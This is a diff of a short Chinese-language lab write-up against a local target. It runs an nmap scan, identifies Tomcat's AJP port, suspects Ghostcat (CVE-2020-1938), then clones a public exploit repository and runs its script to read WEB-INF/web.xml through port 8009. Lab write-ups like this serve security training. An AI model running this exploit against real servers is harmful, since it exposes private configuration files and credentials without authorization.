@@ -1,4 +1,5 @@
 ## 信息收集
+### nmap
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap -A 192.168.56.132    
@@ -40,4 +41,21 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.94 seconds
 -
+```
+发现AJP = Apache 和 Tomcat 之间的通信协议
+
+### 查看页面
+![image.png](https://gitee.com/fogpost/photo/raw/master/202603271859496.png)
+![image.png](https://gitee.com/fogpost/photo/raw/master/202603271859483.png)
+
+初步认为认为是Ghostcat (CVE-2020-1938)
+
+## 攻击靶机
+```bash
+git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
+cd CNVD-2020-10487-Tomcat-Ajp-lfi
+```
+
+```bash
+python3 tomcat-ajp-lfi.py ip -p 8009 -f WEB-INF/web.xml
 ```
